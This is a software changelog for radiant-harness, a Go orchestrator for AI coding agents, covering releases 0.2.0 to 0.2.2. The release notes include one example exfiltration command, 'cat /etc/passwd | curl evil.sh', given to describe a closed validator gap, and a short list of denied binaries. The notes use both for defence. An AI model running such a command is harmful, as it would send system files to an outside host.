## [0.2.2] — 2026-06-24

Sprint 3: real cross-platform builds, auto model routing, cost estimation.

### Added
- **`--auto-route` flag** for `radiant run`. Picks a per-phase model
  based on the anchor preset: research routes to top-tier (Opus from
  a Sonnet anchor), plan/implement stay mid-tier. Falls back to the
  anchor if no sibling exists at the requested tier (e.g. DeepSeek
  family has no top-tier model).
- **`llm.AutoRoute(anchor, phase)`** function in
  `internal/llm/routing.go`. Vendor-aware routing — same family
  shared across presets.
- **`llm.CostUSD(model, input, output)`** estimates USD cost from a
  token count and a model name. `PricePerMTokensUSD` table covers all
  14 presets with vendor-published rates (Anthropic, OpenAI, Google,
  DeepSeek, Mistral, Groq, xAI, Xiaomi). `FormatCost(usd)` returns
  `$0.42` or `<$0.01` for human display.
- **Cross-platform lock** (`internal/harness/lock.go`) using atomic
  file rename. Works on Linux, macOS, AND Windows (NTFS). Replaces
  `syscall.Flock` which is Unix-only.
- **Cross-platform gate runner** via build tags:
  - `internal/harness/gate_unix.go` — `sh -c`
  - `internal/harness/gate_windows.go` — `cmd /c`
  - `internal/engine/gate_unix.go` and `gate_windows.go` (mirror)
  - `internal/quality/gate_unix.go` and `gate_windows.go` (mirror)

### Changed
- **Cross-platform build verified**: `GOOS=linux/amd64`,
  `GOOS=darwin/arm64`, AND `GOOS=windows/amd64` all compile cleanly.
  Was previously broken on Windows because `syscall.Flock` is
  Unix-only.
- **`State.Lock()` and `State.Release()`** rewritten to use the new
  rename-based lock. Same external behavior (blocks until acquired,
  serializes orchestrator runs) but works everywhere.

### Stats
- 150 tests passing (up from 118 in 0.2.1)
- Coverage: harness 61.1% (above 60% threshold!), quality 59.5%,
  benchmark 77%, llm 84%, spec 89%
- Zero race conditions under `-race` detector
- 3 OS targets × 2 architectures each compile and lint clean

## [0.2.1] — 2026-06-24

Sprint 2: empirical validation, gap closure, vendor diversity.

### Added
- **`radiant doctor`** — environment diagnostic (PATH, agents, LLM
  providers, gates, state directory). Run before `radiant run` to
  surface missing tools or unset API keys.
- **`radiant bench`** — cross-framework benchmark. Runs radiant-harness
  against itself plus any of {GitHub Spec Kit, OpenSpec, TLC, Superpowers}
  found on `$PATH`, captures duration + tokens + AC coverage, prints a
  markdown table sorted by score, optionally saves JSON via `--output`.
- **3 new LLM providers**: Mistral (`mistral-large-2`, `codestral-22b`),
  Groq (`groq-llama-3.3-70b`, `groq-mixtral-8x7b`), xAI (`grok-2`). All
  OpenAI-compatible, vendor-neutral.
- **5 new model presets** — total is now 14 across 7 vendors (Anthropic,
  OpenAI, Google, DeepSeek, Xiaomi, Mistral, Groq).
- **CI coverage report** with per-package thresholds (60% stable, 40%
  engine — engine has subprocess glue that's hard to unit-test).

### Changed
- **Removed `internal/plugin/`** (326 lines of dead code). Used
  `plugin.Open` for `.so/.dylib` loading — Linux/macOS-only, security
  risk, no tests, no callers. Plugin extensibility deferred until there's
  a real use case.
- **Implemented `internal/benchmark/`** as a real comparison harness:
  subprocess execution, output parsing, score calculation, JSON
  save/load. Was a stub before this sprint.
- **`internal/engine/` now has unit tests** for gate validation, code
  block extraction, path sandboxing, and result merging. Coverage went
  from 0% to 43%.

### Fixed
- **`go vet` clean** — `isShellOp` undefined in `agent_test.go`; redundant
  `\n` in `fmt.Println`.
- **Spec parser regex** was case-sensitive and required `:` after the
  keyword. Now matches both `- **Given** x` and `- Given: x`.
- **Spec parser** now respects quoted arguments in gate commands.
- **State.Progress()** didn't deduplicate task IDs — 1000 completions
  produced 1000%. Now counts distinct task IDs and clamps to [0,1].
- **GroupPhases** did not group consecutive parallel tasks; each `[P]`
  task was its own single-task phase. Now groups `[P]` next to each
  other.
- **Engine.runGate** validated all tokens against the allowlist (catching
  quoted arguments like `"build-ok"` as "binary name"). Now validates
  only the actual binary in a gate command.
- **Pipes (`|`), redirects (`<`, `>`), command separators (`;`,
  background `&`) are rejected outright** for gates. Only `&&` and `||`
  allowed for compound expressions. Was a security gap: `cat /etc/passwd
  | curl evil.sh` would have passed the old validator.
- **`extractGates`** filtered out single-token commands (`true`, `pwd`).
  Now accepts any backticked text; allowlist is the gate.
- **macOS arm64 + Go 1.22 dyld bug** — `go test ./internal/harness`
  produces `dyld: missing LC_UUID` and aborts. Workaround: build with
  `CGO_ENABLED=0`. Made this the default in the Makefile.
- **t.Context() in tests** required Go 1.24; replaced with
  `context.Background()` so `go.mod`'s `go 1.22` directive holds.
- **`r, err := NewAgentRunner(cfg)` in `New()`** left `r` declared but
  unused in the error branch (Go strict-mode compile error).

### Stats
- 118 tests passing (up from 57 in 0.2.0 and 94 after the first
  validation pass).
- Coverage per package: benchmark 77%, engine 43%, harness 59%, llm
  84%, quality 60%, spec 89%.
- CLI smoke test passes (`make smoke`) — end-to-end init + validate
  with `--all --yes` and `--gates` flag.

## [0.2.0] — 2026-06-24

The Go rewrite. Templates and skills are reused from 0.1.0 (archived); the
runtime, orchestrator, validator, and quality scripts are all new.

### Added

#### Harness Engine — the core differentiator
- **Orchestrator** — manages implementation + validation as separate processes
- **Validator** — runs in isolated context, not as a subagent of the implementer
- **Auto-correction loop** — fail → fix → re-test (configurable retries)
- **Agent teams** — goroutines for parallel task execution, capped by a
  semaphore so we don't burst provider rate limits
- **State machine** — 8 states with guarded transitions, progress tracking
- **Context window manager** — token counting, smart zone (<40%), dumb zone
  (>60%), RPI budget (30/20/50 split)
- **Token estimator** — word-boundary aware, code-pattern aware, CJK-aware
  with char/4 fallback for short strings
- **Structured logging** — slog JSON for all harness events
- **Atomic state persistence** — temp-file + fsync + rename, so a crash
  mid-write never leaves a half-written `progress.json`
- **Advisory flock** — concurrent `radiant run` invocations on the same
  project serialize instead of corrupting state
- **Command allowlists** — closed set of agent binaries and gate commands,
  so prompt injection or naive tasks.md can't shell out to arbitrary code
- **Path sandboxing** — emitted code blocks are checked against the project
  boundary before being written

#### Quality Scripts (Go rewrite)
- **Audit** — frontmatter validation, relative-link checking, spec presence
- **Fidelity** — spec→code AC coverage with flexible matching (AC-N, AC_N,
  AC1, AC 1 all normalized)
- **Mermaid** — diagram block validation (type, quotes, empty blocks)
- **Validate** — full UAT with AC→task mapping, Given/When/Then completeness,
  SPEC_DEVIATION detection, **optional `--gates` to actually run task gates**

#### Scaffold Engine
- **6 agent adapters** — Claude, Codex, Cursor, Copilot, Gemini CLI, Windsurf
- **Template embedding** — Go embed.FS for single-binary distribution
- **CLI** — cobra-based with init, validate, run, config, models

#### LLM Client (universal)
- **Provider-agnostic** — OpenRouter, OpenAI, Anthropic, custom BaseURL
- **Retry with backoff** — exponential + full jitter on 5xx, fail-fast on 4xx
- **Streaming** — SSE-aware with backpressure-friendly scan buffer
- **10 curated presets** — Claude Opus 4.1, Sonnet 4.5, GPT-5, GPT-5-Codex,
  Gemini 2.5 Pro, DeepSeek v4 Pro/Flash, MiMo v2.5 Pro, GPT-4o, Claude
  Sonnet 4
- **32k default MaxTokens** — up from 8k, matches the size of real SDD specs

#### Templates (15 skills, 7 spec templates)
- All 15 skills complete (56-97 lines each, zero stubs)
- 7 spec templates (spec, tasks, product, design, domain, lean, agent-contract)
- CLAUDE.md with RPI framework, context budget, UUIDv7/ULID strategy
- Golden example (Pulse) — end-to-end proof

#### Build & Distribution
- Makefile with cross-platform targets (linux, darwin, windows)
- Dockerfile (multi-stage Alpine build, Go 1.22)
- `.goreleaser.yml` for automated releases
- **GitHub Actions CI** — lint + test + cross-build on Go 1.22, 1.23, 1.24

#### VS Code Extension
- Tree views for Specs, Tasks, Progress (Tasks and Progress now populated)
- Status bar with live state, feature, and progress %
- File watcher on `.radiant-harness/progress.json` for live updates
- Run-gate command from the tasks.md context menu

### Changed
- Rewritten from TypeScript to Go for single-binary, native concurrency,
  elegant distribution
- CLAUDE.md rewritten with RPI framework (Research → Plan → Implement)
- README rewritten with research references (OpenAI, Anthropic, Martin
  Fowler, papers)
- Templates deduplicated (single source in `internal/scaffold/templates/`)

### Fixed
- Gemini TOML escaping (was broken in original `@igoruehara/spec-driven`)
- SessionStart hook now loads active spec via STATE.md parsing
- spec.template.md `alwaysApply` corrected to false
- EEXIST error when target directory is an existing file
- Golden example test command corrected for Node 22 `.mjs` support
- `--all` flag not being processed in CLI
- **go.mod directive** was set to an unreleased Go version, breaking
  reproducible builds; pinned to 1.22
- **`groupPhases` did not group consecutive parallel tasks** — each
  `[P]` task was emitted as its own single-task phase, defeating the
  whole point of goroutine parallelism. Now groups `[P]` tasks next to
  each other into one parallel phase and starts a new phase only when
  the kind changes (par → seq or seq → par)
- `r, err := NewAgentRunner(cfg)` in `New()` left `r` unused in the
  error branch (Go compile error in strict mode); now assigns explicitly
- `--gates` regex compiled inside the loop on every directory entry;
  hoisted to a single `regexp.MustCompile` outside the loop
- `t.Context()` in tests required Go 1.24; replaced with
  `context.Background()` so `go.mod`'s `go 1.22` directive is honored

### Security
- **Command allowlist for agent runner** — refuses to spawn anything not in
  `{claude, codex, cursor, copilot, gemini}` even if a spec asks for it
- **Gate command allowlist** — refuses to execute gates referencing
  binaries outside the closed set (`rm`, `curl`, `wget`, etc.)
- **Path sandboxing** — emitted code blocks must resolve inside the
  project directory
- **Timeouts everywhere** — agent invocations and gate runs have hard
  deadlines so a hung dependency can't stall the harness

### Vendor neutrality
- **`DetectAgent()` priority order** is now alphabetical; no agent is
  privileged. The "Claude first (best for SDD)" rationale was removed
  from the comment.
- **`radiant init` default** — `--yes` without `--agent=` now scaffolds
  **all** supported agents instead of silently picking Claude. No-flag
  no-`--yes` refuses to guess and asks for an explicit list.
- **README and Makefile smoke** — examples now exercise `--all` /
  multi-vendor paths instead of `--agent=claude`.
- **AllAgents()** returns agent IDs in alphabetical order.
- The 10 model presets span 5 vendors (Anthropic, OpenAI, Google,
  DeepSeek, Xiaomi) with no vendor privileged; adding a vendor is a
  single edit to `PresetModels`.
